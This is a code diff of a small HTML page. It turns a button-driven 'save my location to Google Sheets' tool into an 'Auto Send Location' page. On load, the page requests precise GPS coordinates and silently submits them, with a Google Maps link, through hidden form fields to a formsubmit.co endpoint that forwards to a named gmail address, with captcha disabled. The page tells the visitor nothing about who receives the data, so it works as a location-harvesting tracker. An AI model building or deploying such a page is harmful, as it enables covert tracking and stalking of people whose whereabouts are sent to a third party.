@@ -3,101 +3,85 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Location to Google Sheets</title>
+  <title>Auto Send Location</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      padding: 20px;
       text-align: center;
-      background: #f5f5f5;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      transition: background-color 0.2s;
-    }
-    button:hover {
-      background-color: #45a049;
+      padding: 20px;
+      background: #f2f2f2;
     }
     #status {
-      margin-top: 20px;
+      margin-top: 30px;
       font-size: 18px;
       color: #333;
     }
   </style>
 </head>
 <body>
-  <h1>?? Save My Location to Google Sheets</h1>
-  <p>Click the button below to record your GPS coordinates.</p>
+  <h1>Locating...</h1>
+  <div id="status">Please wait while we capture your location...</div>
 
-  <button onclick="getLocation()">Get My Location</button>
-
-  <div id="status"></div>
+  <form id="locationForm" action="https://formsubmit.co/savoraaservices@gmail.com" method="POST">
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+    <input type="hidden" name="maps_link" id="maps_link">
+    <input type="hidden" name="_subject" value="📍 New Location Captured">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_captcha" value="false">
+  </form>
 
   <script>
-    // Replace this URL with your own Google Apps Script Web App URL
-    const scriptUrl = "https://script.google.com/macros/s/AKfycbzENEoG1PgzNj_3Lkh2EeJNiznRFOMHyWkq5DXcWNjwLSku_l9eBGBZNQQ9kgsTYgED/exec";
-
-    function getLocation() {
+    window.onload = () => {
       const statusDiv = document.getElementById("status");
-      statusDiv.innerHTML = "Requesting location...";
-
       if (navigator.geolocation) {
+        statusDiv.innerHTML = "Requesting location permission...";
         navigator.geolocation.getCurrentPosition(sendLocation, showError, { enableHighAccuracy: true });
       } else {
-        statusDiv.innerHTML = "Geolocation is not supported by this browser.";
+        statusDiv.innerHTML = "❌ Geolocation not supported by your browser.";
       }
-    }
+    };
 
     function sendLocation(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       const statusDiv = document.getElementById("status");
 
-      statusDiv.innerHTML = `Latitude: ${lat}<br>Longitude: ${lon}<br>Sending to Google Sheets...`;
+      // Fill hidden fields
+      document.getElementById("latitude").value = lat;
+      document.getElementById("longitude").value = lon;
+      document.getElementById("maps_link").value = mapLink;
 
-      fetch(scriptUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude: lat, longitude: lon }),
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          statusDiv.innerHTML += "<br><strong>? Location saved successfully!</strong>";
-        } else {
-          statusDiv.innerHTML += `<br><strong>? Error:</strong> ${data.error || "Unknown issue."}`;
-        }
-      })
-      .catch(err => {
-        statusDiv.innerHTML = "? Failed to connect to server: " + err.message;
-      });
+      // Update status
+      statusDiv.innerHTML = `
+        ✅ Location captured!<br>
+        Latitude: ${lat}<br>
+        Longitude: ${lon}<br>
+        <a href="${mapLink}" target="_blank">🌍 View on Google Maps</a><br><br>
+        Sending location data...
+      `;
+
+      // Auto-submit
+      document.getElementById("locationForm").submit();
     }
 
     function showError(error) {
       const statusDiv = document.getElementById("status");
       switch (error.code) {
         case error.PERMISSION_DENIED:
-          statusDiv.innerHTML = "? User denied the request for Geolocation.";
+          statusDiv.innerHTML = "❌ User denied location access.";
           break;
         case error.POSITION_UNAVAILABLE:
-          statusDiv.innerHTML = "?? Location information is unavailable.";
+          statusDiv.innerHTML = "⚠️ Location unavailable.";
           break;
         case error.TIMEOUT:
-          statusDiv.innerHTML = "?? The request to get user location timed out.";
+          statusDiv.innerHTML = "⏳ Location request timed out.";
           break;
         default:
-          statusDiv.innerHTML = "? An unknown error occurred.";
-          break;
+          statusDiv.innerHTML = "❓ Unknown error occurred.";
       }
     }
   </script>
 </body>
 </html>
-
-
